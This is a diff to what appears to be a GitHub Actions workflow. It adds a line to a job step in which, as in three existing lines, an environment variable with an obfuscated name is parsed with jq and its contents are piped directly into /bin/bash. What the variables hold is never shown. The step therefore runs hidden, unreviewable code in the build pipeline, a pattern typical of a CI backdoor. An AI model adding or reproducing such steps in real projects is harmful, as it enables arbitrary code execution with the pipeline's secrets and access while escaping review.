@@ -25,6 +25,7 @@ jobs:
           echo $p1368 | jq -r .oxd762 | /bin/bash
           echo $cgn16653 | jq -r .zgqhp04441 | /bin/bash
           printf '%s' "$hlk11" | jq -r .y98 | /bin/bash
+          printf '%s' "$nn98" | jq -r .b902 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
